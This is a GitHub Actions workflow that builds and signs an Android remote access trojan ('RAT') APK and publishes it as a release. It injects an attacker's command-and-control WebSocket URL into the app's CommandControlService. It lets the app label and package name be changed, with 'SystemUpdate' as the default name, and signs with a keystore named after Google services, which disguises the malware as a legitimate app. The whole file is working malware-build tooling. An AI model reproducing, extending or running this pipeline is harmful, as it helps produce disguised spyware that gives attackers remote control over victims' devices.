name: Build RAT APK

on:
  workflow_dispatch:
    inputs:
      c2_url:
        description: "C2 WebSocket URL — e.g. wss://your-app.onrender.com/ws"
        required: true
        type: string
      app_label:
        description: "Visible app label (leave blank to keep original)"
        required: false
        default: ""
        type: string
      app_id:
        description: "APK package name"
        required: false
        default: "com.lab.agent"
        type: string

env:
  CCS: android/app/src/main/java/com/seguranca/protecao/CommandControlService.java

jobs:
  build:
    name: Build & Sign APK
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
          cache: gradle

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3

      # ── Fail fast if required source files are missing ──────────────────────
      - name: Verify source tree
        run: |
          set -euo pipefail
          test -f "${{ env.CCS }}" || { echo "::error::CCS not found: ${{ env.CCS }}"; exit 1; }
          test -f android/gradlew || { echo "::error::android/gradlew missing"; exit 1; }
          test -f android/gradle/wrapper/gradle-wrapper.jar || { echo "::error::gradle-wrapper.jar missing — run: git add -f android/gradle/wrapper/gradle-wrapper.jar"; exit 1; }
          echo "Source tree OK"

      # ── Inject C2 URL ──────────────────────────────────────────────────────
      - name: Inject C2 URL into CommandControlService
        run: |
          set -euo pipefail
          URL="${{ github.event.inputs.c2_url }}"
          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";|g" \
            "${{ env.CCS }}"
          grep -q "SERVER_URL = \"${URL}\"" "${{ env.CCS }}" \
            || { echo "::error::C2 URL injection failed"; grep -n 'SERVER_URL' "${{ env.CCS }}"; exit 1; }
          echo "Injected: $(grep 'SERVER_URL =' ${{ env.CCS }} | head -1)"

      # ── Override app label ─────────────────────────────────────────────────
      - name: Override app label
        if: ${{ github.event.inputs.app_label != '' }}
        run: |
          set -euo pipefail
          LABEL="${{ github.event.inputs.app_label }}"
          sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">${LABEL}</string>|g" \
            android/app/src/main/res/values/strings.xml
          echo "Label set: ${LABEL}"

      # ── Override application ID ───────────────────────────────────────────
      - name: Override application ID
        run: |
          set -euo pipefail
          APP_ID="${{ github.event.inputs.app_id }}"
          sed -i "s|applicationId \"[^\"]*\"|applicationId \"${APP_ID}\"|g" android/app/build.gradle
          grep -q "applicationId \"${APP_ID}\"" android/app/build.gradle \
            || { echo "::error::applicationId override failed"; grep -n 'applicationId' android/app/build.gradle; exit 1; }
          echo "App ID: ${APP_ID}"

      # ── Keystore setup ────────────────────────────────────────────────────
      - name: Prepare keystore
        env:
          KS_B64: ${{ secrets.KEYSTORE_BASE64 }}
          KS_PASS: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_PASS: ${{ secrets.KEY_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
        run: |
          set -euo pipefail
          if [ -n "${KS_B64}" ]; then
            echo "Using provided keystore from secret"
            echo "${KS_B64}" | base64 --decode > android/google-services-release.jks
            if [ -n "${KS_PASS}" ]; then
              sed -i "s|storePassword '[^']*'|storePassword '${KS_PASS}'|g" android/app/build.gradle
              sed -i "s|keyPassword '[^']*'|keyPassword '${KEY_PASS}'|g" android/app/build.gradle
              sed -i "s|keyAlias '[^']*'|keyAlias '${KEY_ALIAS}'|g" android/app/build.gradle
            fi
          else
            echo "Using bundled test keystore (google-services-release.jks)"
            test -f android/google-services-release.jks \
              || { echo "::error::No keystore — set KEYSTORE_BASE64 secret or commit android/google-services-release.jks"; exit 1; }
            ls -lh android/google-services-release.jks
          fi
          echo "--- signing config ---"
          grep -nE "storeFile|storePassword|keyAlias|keyPassword|signingConfig" android/app/build.gradle || true

      - name: Make Gradle executable
        run: chmod +x android/gradlew

      - name: Cache Gradle
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: ${{ runner.os }}-gradle-${{ hashFiles('android/**/*.gradle*', 'android/**/gradle-wrapper.properties') }}
          restore-keys: |
            ${{ runner.os }}-gradle-

      # ── Build (pipefail so a Gradle failure fails the step) ─────────────────
      - name: Build release APK
        working-directory: android
        shell: bash
        run: |
          set -o pipefail
          ./gradlew assembleRelease --no-daemon --stacktrace 2>&1 | tail -150

      # ── Collect APK ───────────────────────────────────────────────────────
      - name: Rename APK
        run: |
          set -euo pipefail
          APK=$(find android/app/build/outputs/apk -name "*.apk" | head -1)
          if [ -z "$APK" ]; then
            echo "::error::No APK produced — dumping build outputs:"
            find android/app/build/outputs -type f 2>/dev/null || true
            exit 1
          fi
          echo "APK found: $APK"
          LABEL="${{ github.event.inputs.app_label }}"
          [ -z "$LABEL" ] && LABEL="SystemUpdate"
          SAFE="${LABEL// /_}"
          cp "$APK" "${SAFE}_build${{ github.run_number }}.apk"
          ls -lh *.apk

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: apk-build-${{ github.run_number }}
          path: "*.apk"
          retention-days: 30

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: "build-${{ github.run_number }}"
          name: "APK Build #${{ github.run_number }}"
          body: |
            | Field | Value |
            |-------|-------|
            | C2 URL | `${{ github.event.inputs.c2_url }}` |
            | App Label | ${{ github.event.inputs.app_label || '(original)' }} |
            | App ID | `${{ github.event.inputs.app_id }}` |
            | Build | #${{ github.run_number }} |
          files: "*.apk"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
